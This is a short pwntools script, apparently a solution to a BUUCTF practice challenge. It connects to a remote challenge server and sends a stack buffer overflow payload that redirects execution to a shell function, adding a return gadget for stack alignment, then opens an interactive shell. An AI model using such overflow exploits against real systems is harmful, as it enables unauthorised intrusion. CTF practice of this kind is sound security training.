#coding:utf-8
from pwn import *
import time
#sh = process("./pwn1")
sh = remote("node3.buuoj.cn",27101)
shell_addr = 0x401186
payload = b'a'*23+p64(0x401185)+p64(0x401186)
#payload += p64(shell_addr) 可以通过本地测试但是不能通过远程测试，猜测应该是检测返回地址的问题
sh.sendline(payload)
sh.interactive()

